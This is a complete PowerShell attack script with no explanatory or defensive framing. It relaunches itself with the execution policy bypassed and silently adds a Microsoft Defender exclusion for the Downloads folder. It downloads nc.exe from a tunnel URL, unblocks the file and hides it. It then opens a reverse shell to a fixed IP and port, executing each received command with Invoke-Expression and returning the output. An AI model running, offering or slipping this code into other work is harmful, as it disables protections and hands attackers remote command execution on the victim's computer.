function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

Ensure-WindowsPowerShell

try {
    # Attempt Defender Exclusion (will fail silently if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Download nc.exe from localhost.run ===
    $ncUrl = "https://03ce78442ce484.lhr.life/nc.exe"  # Replace with your actual localhost.run URL
    $ncPath = "$env:USERPROFILE\Downloads\nc.exe"

    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing

    Unblock-File -Path $ncPath
    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}
catch {
    Write-Error "Execution failed: $_"
}

try {
    # === Reverse shell setup ===
    $client = "192.168.0.114"
    $port = 4444

    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $tcp.Close()
}
catch {
    Write-Error "Execution failed: $_"
}
